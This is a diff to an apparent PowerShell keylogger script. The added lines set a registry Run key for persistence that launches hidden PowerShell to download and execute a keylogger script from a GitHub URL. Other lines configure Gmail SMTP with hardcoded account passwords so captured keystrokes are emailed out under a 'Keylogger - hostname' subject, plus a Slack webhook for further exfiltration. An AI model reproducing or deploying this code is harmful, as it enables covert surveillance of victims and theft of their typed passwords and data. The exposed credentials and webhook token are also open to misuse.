@@ -1,13 +1,15 @@
+# Rersistence (Reg)
+New-itemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "bass" -Value "powershell.exe -w 1 -noni -nop IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/pvgodd/CCIT-2/main/keyloger.ps1')" -PropertyType "String"
 # SMTP.Gmail && Slack API
 $TimesToRun = 2
 $RunTimeP = 1
 $SMTPServer = 'smtp.gmail.com'
 $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
 $SMTPInfo.EnableSsl = $true
-$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('mkinhy258@gmail.com', 'lasntuiocrcohhgu')
+$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('pvgodd99@gmail.com', 'jvyiggrpgogdfrrh')
 $ReportEmail = New-Object System.Net.Mail.MailMessage
-$ReportEmail.From = 'mkinhy258@gmail.com'
-$ReportEmail.To.Add('mkinhy258@gmail.com')
+$ReportEmail.From = 'pvgodd99@gmail.com'
+$ReportEmail.To.Add('pvgodd99@gmail.com')
 $ReportEmail.Subject = 'Keylogger - ' + [System.Net.Dns]::GetHostByName(($env:computerName)).HostName
 #-----------------------------#
 $Webhook = "https://hooks.slack.com/services/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"
